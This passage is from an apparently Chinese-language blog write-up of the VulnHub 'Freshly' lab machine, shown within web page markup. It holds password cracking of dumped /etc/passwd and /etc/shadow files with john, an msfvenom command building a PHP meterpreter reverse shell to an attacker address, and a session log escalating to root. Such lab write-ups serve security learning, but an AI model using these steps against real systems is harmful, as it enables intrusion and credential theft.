class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/false</span><br><span class="line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span><br><span class="line">mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">candycane:x:1001:1001::/home/candycane:</span><br><span class="line"># YOU STOLE MY SECRET FILE!</span><br><span class="line"># SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span><br></pre></td></tr></table></figure></p>
+<p>文件中存在提示，估计是要破解密码<br>下载/etc/passwd和/etc/shadow,在kali中:  </p>
+<blockquote>
+<blockquote>
+<p>unshadow passwd shadow &gt; hashes.txt</p>
+</blockquote>
+</blockquote>
+<p>将SuperSecretPassword也写入/usr/share/john/password.lst中,然后：</p>
+<blockquote>
+<blockquote>
+<p>john hashes.txt</p>
+</blockquote>
+</blockquote>
+<p><img src="/2019/04/19/VulnHub-Freshly-Writeup/6.png" alt=""><br>发现root用户密码就是SuperSecretPassword</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>msf中生成反弹meterpreter：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=5555 -f raw &gt; frenshly.php</span><br></pre></td></tr></table></figure></p>
+<p>菜刀上传frenshly.php至目标,然后配置msf监听,收到反弹meterpreter后,输入shell命令进入shell控制台，输入”su - root”后提示必须在终端运行,于是输入python -c ‘import pty;pty.spawn(“/bin/bash”)’进入终端完成提权.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    : Freshly</span><br><span class="line">OS          : Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686</span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: daemon (1)</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1384 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">su - root</span><br><span class="line">su: must be run from a terminal</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">tythirteen$ ^[[C^[[C^[[C^[[C^[[C1-0/apps/wordpress/htdocs/wp-content/themes/twent</span><br><span class="line"></span><br><span class="line">tythirteen$ su - root                                                            </span><br><span class="line">su - root</span><br><span class="line">Password: SuperSecretPassword</span><br><span class="line"></span><br><span class="line">root@Freshly:~# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>信息收集十分重要,必须充分掌握目标的端口、目录等</li>
+<li>提高sqlmap的level、risk参数能是测试更加完整</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/17/mysql提权总结/" rel="next" title="mysql提权总结">
+                <i class="fa fa-chevron-left"></i> mysql提权总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="tusk1">
+            
+              <p class="site-author-name" itemprop="name">tusk1</p>
+              <p class="site-description motion-element" itemprop="description">奋斗、寻觅，而不屈服</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1592129863&website=www.oicqzone.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-globe"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1592129863@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#目标"><span class="nav-number">1.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息搜集"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wpscan扫描"><span class="nav-number">2.2.</span> <span class="nav-text">wpscan扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录扫描"><span class="nav-number">2.3.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透"><span class="nav-number">3.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">3.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wordpress后台getshell"><span class="nav-number">3.2.</span> <span class="nav-text">wordpress后台getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">3.3.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tusk1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
